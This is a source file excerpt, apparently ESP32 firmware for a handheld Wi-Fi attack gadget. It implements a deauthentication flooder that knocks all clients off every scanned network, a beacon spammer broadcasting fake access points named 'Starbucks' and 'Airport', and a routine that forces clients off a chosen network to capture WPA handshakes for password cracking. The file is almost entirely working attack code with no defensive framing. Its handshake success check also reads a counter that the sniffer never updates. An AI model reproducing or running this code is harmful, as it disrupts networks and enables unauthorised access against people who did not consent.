void scanWiFi() {
    showMessage("SCANNING...", 500);
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(200);
    networkCount = WiFi.scanNetworks();
    if (networkCount > 50) networkCount = 50;
    for (int i = 0; i < networkCount; i++) {
        networkNames[i] = WiFi.SSID(i);
        if (networkNames[i].length() == 0) networkNames[i] = "<Hidden>";
        networkChannel[i] = WiFi.channel(i);
        memcpy(networkBSSID[i], WiFi.BSSID(i), 6);
    }
    char buf[32]; sprintf(buf, "Found: %d", networkCount);
    showSuccess("SCAN DONE", buf);
    WiFi.mode(WIFI_AP_STA);
}

void sendDeauthPacket(uint8_t* bssid, uint8_t* client, int ch) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    uint8_t packet[] = {0xC0,0x00,0x00,0x00,client[0],client[1],client[2],client[3],client[4],client[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
        bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],0x00,0x00,0x07,0x00};
    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
    deauthPackets++;
}

void startDeauth() {
    if (networkCount == 0) { showError("SCAN FIRST!", ""); return; }
    deauthActive = true; deauthPackets = 0;
    showSuccess("DEAUTH STARTED", "Press BACK to stop");
    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    while (deauthActive) {
        for (int i = 0; i < networkCount && deauthActive; i++) {
            sendDeauthPacket(networkBSSID[i], broadcast, networkChannel[i]);
        }
        if (checkButton(BTN_BACK)) deauthActive = false;
        delay(50);
    }
    showSuccess("DEAUTH STOPPED", "");
}
void stopDeauth() { deauthActive = false; }

void startBeacon() {
    beaconActive = true; beaconPackets = 0;
    const char* ssids[] = {"FREE_WIFI","Starbucks","Airport","Metro","Public"};
    showSuccess("BEACON STARTED", "Press BACK to stop");
    while (beaconActive) {
        for (int s = 0; s < 5 && beaconActive; s++) {
            uint8_t bssid[6];
            for (int i = 0; i < 6; i++) bssid[i] = random(256);
            bssid[0] |= 0x02;
            uint8_t packet[200]; int len = 0;
            packet[len++] = 0x80; packet[len++] = 0x00; packet[len++] = 0x00; packet[len++] = 0x00;
            for (int i = 0; i < 6; i++) packet[len++] = 0xFF;
            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
            for (int i = 0; i < 6; i++) packet[len++] = bssid[i];
            packet[len++] = 0x00; packet[len++] = 0x00;
            for (int i = 0; i < 8; i++) packet[len++] = 0x00;
            packet[len++] = 0x64; packet[len++] = 0x00; packet[len++] = 0x11; packet[len++] = 0x00;
            packet[len++] = 0x00; packet[len++] = strlen(ssids[s]);
            for (int i = 0; i < (int)strlen(ssids[s]); i++) packet[len++] = ssids[s][i];
            esp_wifi_80211_tx(WIFI_IF_STA, packet, len, false);
            beaconPackets++;
        }
        if (checkButton(BTN_BACK)) beaconActive = false;
        delay(30);
    }
    showSuccess("BEACON STOPPED", "");
}
void stopBeacon() { beaconActive = false; }

void handshakeSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!handshakeActive) return;
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    int len = pkt->rx_ctrl.sig_len;
    uint8_t* payload = pkt->payload;
    if (len < 30) return;
    for (int i = 0; i < len - 8; i++) {
        if (payload[i] == 0x88 && payload[i+1] == 0x8E) {
            handshakes += "[HANDSHAKE] " + String(millis()/1000) + "s\n";
            saveData();
            showSuccess("HANDSHAKE CAPTURED!", "");
            handshakeActive = false;
            return;
        }
    }
}

void startHandshake() {
    if (networkCount == 0) { showError("SCAN FIRST!", ""); return; }
    int target = 0;
    while (true) {
        u8g2.clearBuffer(); drawTopBar(); u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(5, 15, "SELECT AP:");
        for (int i = 0; i < min(networkCount, 5); i++) {
            int y = 25 + i * 10;
            if (i == target) { u8g2.drawBox(0, y-6, 128, 10); u8g2.setDrawColor(0); u8g2.drawStr(10, y, networkNames[i].substring(0, 14).c_str()); u8g2.setDrawColor(1); }
            else { u8g2.drawStr(10, y, networkNames[i].substring(0, 14).c_str()); }
        }
        u8g2.drawStr(2, 62, "UP/DN=select OK=start BACK=exit");
        u8g2.sendBuffer();
        if (checkButton(BTN_UP) && target > 0) target--;
        else if (checkButton(BTN_DOWN) && target < min(networkCount, 5)-1) target++;
        else if (checkButton(BTN_OK)) break;
        else if (checkButton(BTN_BACK)) return;
        delay(50);
    }
    memcpy(targetBSSID, networkBSSID[target], 6);
    esp_wifi_set_channel(networkChannel[target], WIFI_SECOND_CHAN_NONE);
    handshakeActive = true; eapolCount = 0;
    showMessage("CAPTURING... 30s", 1500);
    unsigned long start = millis();
    uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    while (handshakeActive && millis() - start < 30000) {
        sendDeauthPacket(targetBSSID, broadcast, networkChannel[target]);
        if (checkButton(BTN_BACK)) handshakeActive = false;
        delay(100);
    }
    handshakeActive = false;
    if (eapolCount > 0) showSuccess("HANDSHAKE SAVED!", "");
    else showError("FAILED!", "");
}

